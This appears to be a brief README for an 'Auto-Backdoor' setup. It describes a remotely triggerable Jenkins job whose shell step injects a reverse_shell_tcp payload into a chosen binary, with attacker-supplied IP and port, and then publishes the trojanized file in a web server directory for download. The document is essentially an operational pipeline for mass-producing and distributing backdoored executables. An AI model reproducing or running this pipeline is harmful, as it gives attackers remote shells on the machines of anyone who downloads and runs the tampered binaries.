# Auto-Backdoor
Need a jenkins server running, on it make a build, this build needs to be paramatized with the following text pramaters

`dir` 
`Payload_Type`
`port`
`IP`
`binName`


Turn on trigger build remotly

Add build shell step with

`cp /in/$dir .
backdoor -f $dir -P $port -H $IP -s reverse_shell_tcp
cp backdoored/$dir /var/www/html/out/$dir
echo "DONE"
`
